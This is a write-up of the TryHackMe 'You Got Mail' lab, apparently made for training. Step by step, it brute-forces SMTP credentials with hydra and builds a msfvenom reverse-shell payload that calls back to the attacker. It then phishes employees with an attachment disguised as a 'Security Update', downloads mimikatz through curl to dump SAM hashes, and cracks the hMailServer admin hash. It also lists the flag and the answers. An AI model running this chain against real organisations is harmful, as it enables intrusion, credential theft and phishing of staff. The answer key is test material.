<h1 align="center"> You Got Mail </h1>

<img width="1503" height="253" alt="image" src="https://github.com/user-attachments/assets/0d632fa0-ffba-4b5b-86bf-d53b7b7181c8" />


---


### Lab RooM;

https://tryhackme.com/room/yougotmail

---


### Scoreboard

<img width="1126" height="496" alt="image" src="https://github.com/user-attachments/assets/111a3b58-b127-413a-b908-1613cece1a59" />


---

## Task 1: Scenario 


### Connect Machine:

<img width="1127" height="453" alt="image" src="https://github.com/user-attachments/assets/6c00c948-66c0-40be-904a-7d03f0cd0970" />



So in this my target is:
````
10.49.191.145
````
<img width="863" height="360" alt="image" src="https://github.com/user-attachments/assets/6263722e-594e-4d38-87ca-c119b9d677a9" />


---

### Lab Guide:

You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on ``10.49.191.145`` and strictly passive reconnaissance on brownbrick.co (opens in new tab). The scope includes only the domain and IP provided and does not include other TLDs.

To begin, start the Lab Machine by pressing the Start Lab Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. Please allow 3-4 minutes for the VM to fully boot up.


---


### Question & Answer:

<img width="1119" height="143" alt="image" src="https://github.com/user-attachments/assets/cbba9597-046c-48cb-8df2-c5b83fb37563" />




----



## Task 2: Flag Submission

Questions & Answers Flag:

<img width="1106" height="337" alt="image" src="https://github.com/user-attachments/assets/5b66fe07-109d-4f6c-a7d4-d5ae1ba289f9" />



----



### Scan target:
````
nmap -T4 -n -sC -sV -Pn -p- 10.49.191.145
````

<img width="1039" height="1038" alt="image" src="https://github.com/user-attachments/assets/b147b0e6-5794-4ab4-aea9-6126727f6314" />


Now we see port that open.


### Recon brownbrick.co

Go to: https://brownbrick.co


Or open: https://brownbrick.co/menu.html

<img width="1858" height="1023" alt="image" src="https://github.com/user-attachments/assets/47f13edf-3287-4b93-9088-d14909fde3a7" />


Look at the Our Team information.

Now we see thier email address:
````
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
````



Create ``emails.txt``:

Open terminal:
````
nano emails.txt
````
Then input this:
````
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
````
<img width="1135" height="375" alt="image" src="https://github.com/user-attachments/assets/b66af059-c9e9-4784-ae2c-e9ed1072a700" />


Save: ``CTRL + O`` -> ``ENTER`` -> ``CTRL + X``


Check:
````
cat emails.txt
````
<img width="408" height="289" alt="image" src="https://github.com/user-attachments/assets/7b7705c7-3460-4822-a9fe-7509c1375b84" />


Now we see thier email.



#### Generate the password list

Use CeWL against the permitted passive-recon website:
````
cewl --lowercase https://brownbrick.co/ > passwords.txt
````

<img width="1308" height="320" alt="image" src="https://github.com/user-attachments/assets/9028843f-f926-4c8f-81dd-619b2ee3fd00" />


Check:
````
cat passwords.txt
````
<img width="973" height="950" alt="image" src="https://github.com/user-attachments/assets/105cded5-3400-4eee-832b-ef311706e9be" />


Find the valid email password:
````
hydra -L THM/emails.txt -P passwords.txt 10.49.191.145 smtp -s 587 -t 16
````
<img width="1901" height="1013" alt="image" src="https://github.com/user-attachments/assets/b225ef1c-5f7a-47ae-a6b5-418e54d62caf" />


In this we need to wait a few minute.

And we see result:

<img width="1826" height="1037" alt="image" src="https://github.com/user-attachments/assets/bf41d2a2-be74-485c-8b67-87f5a6985fee" />


| Item     | Value                   |
| -------- | ----------------------- |
| Email    | `lhedvig@brownbrick.co` |
| Password | `bricks`                |
| SMTP     | `10.49.191.145:587`     |




Check attacker IP:
````
ifconfig
````
<img width="757" height="842" alt="image" src="https://github.com/user-attachments/assets/555a8061-3b3d-44fc-bc07-5d2480c5d292" />


Now my attacker IP is:
````
10.49.109.100
````


#### Create the payload
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.49.109.100 LPORT=443 -f exe -o shell.exe
````
<img width="1062" height="166" alt="image" src="https://github.com/user-attachments/assets/fbf81eae-a72b-4ec7-bc16-34663c0fc157" />


Check:
````
ls -l shell.exe
````
<img width="474" height="90" alt="image" src="https://github.com/user-attachments/assets/afd7145d-43fa-44e7-b942-282904dddd96" />



On Attacker start Listener:

````
nc -lvnp 443
````

<img width="427" height="100" alt="image" src="https://github.com/user-attachments/assets/34b1989e-ee80-4f04-b4b8-51ffacaba93d" />


Also in this we have 

| Item     | Value                   |
| -------- | ----------------------- |
| Email    | `lhedvig@brownbrick.co` |
| Password | `bricks`                |


The lab's published solution uses SMTP authentication to send the attachment to the discovered employees.

We can send to the users with:
````
for email in oaurelius@brownbrick.co tchikondi@brownbrick.co wrohit@brownbrick.co pcathrine@brownbrick.co fstamatis@brownbrick.co
do
    sendemail \
    -f "lhedvig@brownbrick.co" \
    -t "$email" \
    -u "Security Update" \
    -m "Please review the attached update." \
    -a shell.exe \
    -s 10.49.191.145:25 \
    -xu "lhedvig@brownbrick.co" \
    -xp "bricks"
done
````
<img width="1411" height="368" alt="image" src="https://github.com/user-attachments/assets/8e9ebeb5-83af-4b78-8154-0647e86a2fd6" />


Then back to terminal that listener:

<img width="532" height="189" alt="image" src="https://github.com/user-attachments/assets/38b19ae3-176e-4e43-bb55-8a94ec685207" />


Now we got shell.


Test command:
````
whoami
````
<img width="303" height="143" alt="image" src="https://github.com/user-attachments/assets/c992d8a7-9ee2-45e1-aebd-21dc0693859a" />


````
cd ../../
````
<img width="612" height="796" alt="image" src="https://github.com/user-attachments/assets/cb6e7df1-ba18-41da-b5aa-bde4ae8764b0" />




````
cd Users/wrohit/
````
<img width="643" height="853" alt="image" src="https://github.com/user-attachments/assets/8205353a-56a5-45c9-a707-2beff9cd8f5c" />



Then I check locat eof flag:
````
dir C:\Users\wrohit /s /b | findstr flag
````
<img width="606" height="135" alt="image" src="https://github.com/user-attachments/assets/81732c18-7e6d-4243-aae0-da80122bf2c7" />


Now I see location of flag stay in: ``C:\Users\wrohit\Desktop\flag.txt``

Then check:
````
type C:\Users\wrohit\Desktop\flag.txt
````
<img width="530" height="95" alt="image" src="https://github.com/user-attachments/assets/4cd45f36-82bb-4fb6-be01-80d238df6d04" />


Now we see the flag is.

### 1. What is the user flag?

#### Flag:
````
THM{l1v1n_7h3_br1ck_l1f3}
````
<img width="1109" height="90" alt="image" src="https://github.com/user-attachments/assets/b581bf91-2732-4bc2-8092-13d2f900e91e" />


----



### Check wrohit's privileges

````
whoami /priv
````
<img width="1093" height="603" alt="image" src="https://github.com/user-attachments/assets/865b52f3-d19d-427d-857b-89d6990e95a4" />



````
whoami /groups
````
<img width="1377" height="384" alt="image" src="https://github.com/user-attachments/assets/bd5aa7c5-2857-4dce-9c90-864f3a90e043" />


The important thing to investigate is whether our account actually has administrative privileges or merely has the group listed in the token.



#### Get wrohit's password

locate our Mimikatz executable and start an HTTP server in that directory:

````
python3 -m http.server 80
````
<img width="570" height="120" alt="image" src="https://github.com/user-attachments/assets/99893c45-0327-428e-ae43-046d8e8555bd" />


````
cd C:\ProgramData
````
<img width="642" height="801" alt="image" src="https://github.com/user-attachments/assets/b79f5c34-9eb8-43c9-97b4-ec7af8c4846c" />


````
curl http://10.49.109.100/mimikatz.exe -o mimikatz.exe
````

<img width="727" height="161" alt="image" src="https://github.com/user-attachments/assets/27844f41-4fb4-4047-baa8-345cf1ef3a26" />


Run Mimikatz

````
mimikatz.exe
````
<img width="731" height="216" alt="image" src="https://github.com/user-attachments/assets/9b228cd8-ea0e-45fe-b28d-54ee28eb9036" />


````
privilege::debug
````
<img width="787" height="238" alt="image" src="https://github.com/user-attachments/assets/411291f3-75d3-43de-b521-45acd1906797" />



Then:
````
token::elevate
````
<img width="1291" height="185" alt="image" src="https://github.com/user-attachments/assets/a4d22f38-b583-42bc-9aea-7deb4d7b08ec" />




Then:
````
lsadump::sam
````
<img width="921" height="757" alt="image" src="https://github.com/user-attachments/assets/dc1a9146-4fa9-4180-94e4-a070b05fe79c" />


Then scroll down, and we see this:

<img width="911" height="737" alt="image" src="https://github.com/user-attachments/assets/4331a56c-08af-4d17-9d89-845f756a70e6" />


Now we see has:
````
8458995f1d0a4b0c107fb8e23362c814
````

#### Crack the Hash

Go to: https://crackstation.net/

<img width="1861" height="942" alt="image" src="https://github.com/user-attachments/assets/1f424c34-1b1d-4a77-b081-10ad63fceca8" />


Now we see reslut s:
````
superstar
````
Now we got password of wrohit.


### 2. What is the password of the user wrohit?

#### Password:
````
superstar
````
<img width="1759" height="150" alt="image" src="https://github.com/user-attachments/assets/e41b5500-563c-41ad-ada1-c2702c5272f4" />


----



### Find the hMailServer password

````
exit
````
<img width="787" height="781" alt="image" src="https://github.com/user-attachments/assets/abeb0a39-7e59-4024-b3a5-92924897fa95" />


in this we need to exit from Mimikatz.

````
type "C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI"
````

<img width="689" height="457" alt="image" src="https://github.com/user-attachments/assets/3cbcbcb5-525c-4410-8677-80926d489679" />


Now we see: 
````
AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
````
  


#### Crack the Administrator hash

Go back to: https://crackstation.net/

Input hash:
````
5f4dcc3b5aa765d61d8327deb882cf99
````
<img width="1417" height="733" alt="image" src="https://github.com/user-attachments/assets/b9e511b3-27ef-471f-99d6-8c7140f17788" />




Now we see password admin:
````
password
````

### 3. What is the password to access the hMailServer Administrator Dashboard?


#### Password Admin:
````
password
````
<img width="1744" height="176" alt="image" src="https://github.com/user-attachments/assets/a0608d43-0882-47a9-8ab9-9bf214f96047" />


--------



### Summary Flag:


#### 1. What is the user flag?
````
THM{l1v1n_7h3_br1ck_l1f3}
````

#### 2. What is the password of the user wrohit?
````
superstar
````

#### 3. What is the password to access the hMailServer Administrator Dashboard?
````
password
````

---

<img width="1772" height="507" alt="image" src="https://github.com/user-attachments/assets/19500159-6f14-4a74-bc9b-09eda6fdbe54" />


-------



### Now we completed The Lab:

<img width="1339" height="725" alt="image" src="https://github.com/user-attachments/assets/508c51ee-221f-440a-b932-2a939f720152" />


-----
